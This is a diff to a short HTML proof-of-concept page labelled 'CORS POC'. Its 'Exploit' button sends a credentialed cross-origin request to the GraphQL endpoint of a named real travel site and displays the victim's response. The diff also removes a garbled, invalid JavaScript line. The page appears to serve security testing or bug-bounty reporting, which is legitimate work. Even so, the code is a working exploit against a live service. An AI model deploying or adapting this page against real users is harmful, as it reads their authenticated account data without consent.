@@ -3,9 +3,9 @@
 <body>
 <center>
 <h2>CORS POC </h2>
-<h3>Extract</h3>
+<h3>Extract </h3>
  
-<div id="TileContainer">
+<div id="mockDataEnabled">
 <button type="button" onclick="cors()">Exploit</button>
 </div>
  
@@ -14,15 +14,14 @@ function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("TileContainer").innerHTML = alert(this.responseText);
+      document.getElementById("mockDataEnabled").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://agoda.com/graphql", true);
+  xhttp.open("GET", "https://www.agoda.com/graphql", true);
   xhttp.withCredentials = true;
   xhttp.send();
-  xhttp.agoda.user.03();
 }
 </script>
- 
+    </center>
 </body>
 </html>
